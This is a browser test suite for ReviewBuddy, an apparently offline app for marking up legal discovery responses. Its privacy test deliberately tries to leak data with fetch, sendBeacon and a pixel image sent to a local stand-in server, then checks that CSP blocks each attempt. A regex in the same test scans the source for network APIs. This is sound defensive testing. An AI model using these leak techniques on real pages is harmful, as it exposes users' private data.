// Browser tests: run with `node --test tests/` (uses the pre-installed Playwright Chromium).
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { fileURLToPath } from 'node:url';
import { readFile } from 'node:fs/promises';
import http from 'node:http';
import { serve } from './serve.mjs';

const require = createRequire(import.meta.url);
const { chromium, devices } = require('playwright');
const FIX = (n) => fileURLToPath(new URL(`./fixtures/${n}`, import.meta.url));
const APP_FILES = new Set(['/', '/index.html', '/css/styles.css', '/js/app.js', '/js/parse.js', '/js/docx.js', '/js/sample.js', '/manifest.webmanifest', '/icons/icon.svg', '/icons/icon-180.png']);

let server, base, browser;
before(async () => {
  server = await serve();
  base = `http://127.0.0.1:${server.address().port}/`;
  browser = await chromium.launch();
});
after(async () => { await browser.close(); server.close(); });

async function newPage(t) {
  const ctx = await browser.newContext({ ...devices['iPhone 13'], serviceWorkers: 'block' });
  const page = await ctx.newPage();
  const requests = [];
  page.on('request', (r) => requests.push(r.url()));
  const errors = [];
  page.on('pageerror', (e) => errors.push(String(e)));
  page.on('console', (m) => { if (m.type() === 'error') errors.push(m.text()); });
  t.after(() => ctx.close());
  await page.goto(base);
  return { ctx, page, requests, errors };
}

async function openDocx(page, name) {
  const [chooser] = await Promise.all([page.waitForEvent('filechooser'), page.getByRole('button', { name: /Open draft/ }).first().click()]);
  await chooser.setFiles(FIX(name));
}

test('loads a .docx, shows requests read-only and responses as tappable sentences', async (t) => {
  const { page, errors } = await newPage(t);
  await openDocx(page, 'fictional_round1.docx');
  await page.waitForSelector('#sec-rfp-1');
  assert.deepEqual(await page.$$eval('section.rfp h2', (els) => els.map((e) => e.textContent)), ['RFP No. 1', 'RFP No. 2', 'RFP No. 3']);
  // Requests: full text present, nothing annotatable
  assert.equal(await page.textContent('#sec-rfp-1 .request p'), 'All DOCUMENTS RELATING TO the widget contract.');
  assert.equal(await page.$$eval('.request .sent', (e) => e.length), 0);
  // Responses keep paragraphs and are split into sentences
  const rfp1 = await page.$$eval('#sec-rfp-1 .para', (ps) => ps.map((p) => [...p.querySelectorAll('.sent')].map((s) => s.textContent)));
  assert.deepEqual(rfp1, [
    ['Responding Party objects to this Request as vague.', 'See Smith v. Jones, 123 F.3d 456 (9th Cir. 2001).'],
    ['Responding Party will produce responsive documents.'],
  ]);
  // table text is included in RFP 2's response
  assert.match(await page.textContent('#sec-rfp-2 .response'), /identified in Exhibit A/);
  // preamble and closing are separate, collapsed sections
  assert.equal(await page.$eval('#sec-pre', (e) => e.open), false);
  assert.equal(await page.$eval('#sec-post', (e) => e.open), false);
  // every paragraph has its own color selector
  assert.equal(await page.$$eval('#sec-rfp-1 .para .tools', (e) => e.length), 2);
  assert.deepEqual(errors, []);
});

test('highlights, comments, notes and ratings autosave and survive reload', async (t) => {
  const { page, errors } = await newPage(t);
  await openDocx(page, 'fictional_round1.docx');
  const s = (k) => page.locator(`[data-k="${k}"]`);

  await s('rfp-1|0|0').tap();                                   // default tool = green
  await page.locator('#sec-rfp-1 .para').nth(0).locator('.tool.red').tap();
  await s('rfp-1|0|1').tap();
  await page.locator('#sec-rfp-1 .para').nth(1).locator('.tool.yellow').tap();
  await s('rfp-1|1|0').tap();
  await s('rfp-2|0|0').tap(); await s('rfp-2|0|0').tap();       // tap twice = clear
  // paragraph "All" button
  await page.locator('#sec-rfp-2 .para').nth(0).locator('.tool.green').tap();
  await page.locator('#sec-rfp-2 .para').nth(0).locator('.tool.all').tap();
  // comment
  await page.locator('#sec-rfp-1 .tool.comment').first().tap();
  await s('rfp-1|0|1').tap();
  await page.fill('#comment-text', 'Cite the local rule instead.');
  await page.tap('#btn-comment-save');
  // rating + notes
  await page.locator('[data-rate="rfp-1|mixed"]').tap();
  await page.fill('[data-notes="rfp-1"]', 'Tighten the objection.');

  await page.waitForTimeout(600);
  await page.reload();
  await page.waitForSelector('#sec-rfp-1');
  assert.match(await s('rfp-1|0|0').getAttribute('class'), /m-green/);
  assert.match(await s('rfp-1|0|1').getAttribute('class'), /m-red/);
  assert.match(await s('rfp-1|0|1').getAttribute('class'), /has-comment/);
  assert.match(await s('rfp-1|1|0').getAttribute('class'), /m-yellow/);
  assert.match(await s('rfp-2|0|0').getAttribute('class'), /m-green/);
  assert.match(await s('rfp-2|0|1').getAttribute('class'), /m-green/);
  assert.equal(await page.locator('[data-rate="rfp-1|mixed"]').getAttribute('aria-checked'), 'true');
  assert.equal(await page.inputValue('[data-notes="rfp-1"]'), 'Tighten the objection.');

  // undo works
  await page.locator('#sec-rfp-3 .tool.green').first().tap();
  await s('rfp-3|0|0').tap();
  assert.match(await s('rfp-3|0|0').getAttribute('class'), /m-green/);
  await page.tap('#btn-undo');
  assert.doesNotMatch(await s('rfp-3|0|0').getAttribute('class'), /m-/);

  // submit -> structured feedback
  await page.tap('#btn-export');
  const text = await page.inputValue('#export-text');
  assert.match(text, /RFP NO\. 1 — Overall: MIXED/);
  assert.match(text, /Notes: Tighten the objection\./);
  assert.match(text, /RED — revise:\n  \[RFP No\. 1 ¶1 S2\] “See Smith v\. Jones, 123 F\.3d 456 \(9th Cir\. 2001\)\.”\n      Comment: Cite the local rule instead\./);
  assert.match(text, /YELLOW — needs refinement:\n  \[RFP No\. 1 ¶2 S1\] “Responding Party will produce responsive documents\.”/);
  assert.match(text, /GREEN — approved, keep verbatim: ¶1 S1\n/);
  assert.match(text, /RFP NO\. 2 — Overall: NOT RATED[\s\S]*GREEN — approved, keep verbatim: ¶1 S1–S2/);
  assert.match(text, /RFP NO\. 3 — Overall: NOT RATED[\s\S]*UNMARKED: ¶1 S1/);
  assert.match(text, /Preserve GREEN \(approved\) sentences word-for-word/);

  // downloads (.txt and .json backup)
  const [dl] = await Promise.all([page.waitForEvent('download'), page.tap('#btn-save-json')]);
  const backup = JSON.parse(await readFile(await dl.path(), 'utf8'));
  assert.equal(backup.format, 'reviewbuddy-review');
  const fb1 = backup.feedback.find((f) => f.section === 'rfp-1');
  assert.equal(fb1.rating, 'mixed');
  assert.deepEqual(fb1.sentences.map((x) => x.color), ['green', 'red', 'yellow']);
  assert.deepEqual(errors, []);
});

test('round 2 keeps approved unchanged sentences and flags changes', async (t) => {
  const { page, errors } = await newPage(t);
  await openDocx(page, 'fictional_round1.docx');
  const s = (k) => page.locator(`[data-k="${k}"]`);
  await page.locator('#sec-rfp-1 .para').nth(0).locator('.tool.all').tap(); // both green
  await page.locator('#sec-rfp-1 .para').nth(1).locator('.tool.red').tap();
  await s('rfp-1|1|0').tap();                                                // red -> will be rewritten
  await page.locator('#sec-rfp-3 .tool.red').first().tap();
  await s('rfp-3|0|0').tap();                                                // red but unchanged in round 2
  await page.fill('[data-notes="rfp-1"]', 'Add a production deadline.');
  await page.waitForTimeout(500);

  const [chooser] = await Promise.all([page.waitForEvent('filechooser'), page.getByRole('button', { name: /Load revised draft/ }).tap()]);
  await chooser.setFiles(FIX('fictional_round2.docx'));
  await page.getByRole('button', { name: /Round 2 of/ }).tap();
  await page.waitForSelector('.banner');
  assert.match(await page.textContent('#doc-title'), /Round 2/);
  assert.match(await s('rfp-1|0|0').getAttribute('class'), /m-green.*carried|carried.*m-green/);
  assert.match(await s('rfp-1|0|1').getAttribute('class'), /m-green/);
  const c = await s('rfp-1|1|0').getAttribute('class');
  assert.match(c, /chg-new/); assert.doesNotMatch(c, /m-/);
  assert.match(await s('rfp-3|0|0').getAttribute('class'), /chg-unrev/);
  assert.match(await page.textContent('#sec-rfp-1 .prev-notes'), /Add a production deadline\./);
  // both rounds are saved separately
  await page.tap('#btn-menu');
  assert.equal(await page.locator('#library-body .saved-list li').count(), 2);
  assert.deepEqual(errors, []);
});

test('privacy: only the app’s own files load, nothing leaves the page, network is blocked by CSP', async (t) => {
  const { page, requests } = await newPage(t);
  const before = requests.length;
  await openDocx(page, 'fictional_round1.docx');
  await page.waitForSelector('#sec-rfp-1');
  await page.locator('[data-k="rfp-1|0|0"]').tap();
  await page.fill('[data-notes="rfp-1"]', 'secret note');
  await page.waitForTimeout(600);
  await page.tap('#btn-export');
  await page.tap('#btn-copy').catch(() => {});
  await page.waitForTimeout(300);

  for (const u of requests) {
    const url = new URL(u);
    assert.equal(url.origin, new URL(base).origin, `unexpected external request: ${u}`);
    assert.ok(APP_FILES.has(url.pathname), `unexpected request: ${u}`);
  }
  assert.equal(requests.length, before, `requests made after opening a document: ${requests.slice(before).join(', ')}`);

  // Even deliberate attempts to send data are blocked by the Content-Security-Policy.
  // A separate "outside" server records every hit it receives; it must receive none.
  let hits = 0;
  const outside = http.createServer((req, res) => { hits++; res.end('x'); });
  await new Promise((ok) => outside.listen(0, '127.0.0.1', ok));
  t.after(() => outside.close());
  const target = `http://127.0.0.1:${outside.address().port}`;
  const attempts = await page.evaluate(async (target) => {
    const r = {};
    const violations = [];
    document.addEventListener('securitypolicyviolation', (e) => violations.push(e.effectiveDirective));
    try { await fetch(target + '/x', { method: 'POST', body: 'leak' }); r.fetchExternal = 'allowed'; } catch { r.fetchExternal = 'blocked'; }
    try { await fetch('/x'); r.fetchSelf = 'allowed'; } catch { r.fetchSelf = 'blocked'; }
    try { navigator.sendBeacon(target + '/b', 'leak'); } catch { /* blocked */ }
    await new Promise((ok) => { const i = new Image(); i.onload = () => { r.img = 'allowed'; ok(); }; i.onerror = () => { r.img = 'blocked'; ok(); }; i.src = target + '/pixel.gif?leak'; });
    await new Promise((ok) => setTimeout(ok, 300));
    r.violations = [...new Set(violations)].sort();
    return r;
  }, target);
  assert.deepEqual(attempts, { fetchExternal: 'blocked', fetchSelf: 'blocked', img: 'blocked', violations: ['connect-src', 'img-src'] });
  await page.waitForTimeout(500);
  assert.equal(hits, 0, 'the outside server received a request');

  // No cookies; the only stored data is ReviewBuddy's own local key.
  assert.deepEqual(await page.context().cookies(), []);
  assert.deepEqual(await page.evaluate(() => Object.keys(localStorage)), ['reviewbuddy:v1']);

  // Source code contains no network APIs or third-party URLs.
  for (const f of ['js/app.js', 'js/parse.js', 'js/docx.js', 'js/sample.js', 'index.html', 'css/styles.css']) {
    const src = await readFile(fileURLToPath(new URL(`../${f}`, import.meta.url)), 'utf8');
    assert.doesNotMatch(src, /\bfetch\(|XMLHttpRequest|sendBeacon|WebSocket|EventSource|https?:\/\/(?!www\.w3\.org|schemas\.openxmlformats\.org)/, `${f} references the network`);
  }
});

test('erase all data removes everything', async (t) => {
  const { page } = await newPage(t);
  await page.getByRole('button', { name: /fictional sample/ }).tap();
  await page.waitForSelector('#sec-rfp-1');
  page.on('dialog', (d) => d.accept());
  await page.tap('#btn-menu');
  await page.getByRole('button', { name: 'Erase all data on this device' }).tap();
  assert.deepEqual(await page.evaluate(() => Object.keys(localStorage)), []);
  assert.equal(await page.locator('.welcome').count(), 1);
});

test('plain-text paste works', async (t) => {
  const { page } = await newPage(t);
  await page.getByRole('button', { name: 'Paste text instead' }).tap();
  await page.fill('#paste-text', 'REQUEST NO. 7: All maps.\nRESPONSE TO REQUEST NO. 7: None exist. Plaintiff searched.');
  await page.tap('#btn-paste-load');
  await page.waitForSelector('#sec-rfp-7');
  assert.equal(await page.locator('#sec-rfp-7 .sent').count(), 2);
});
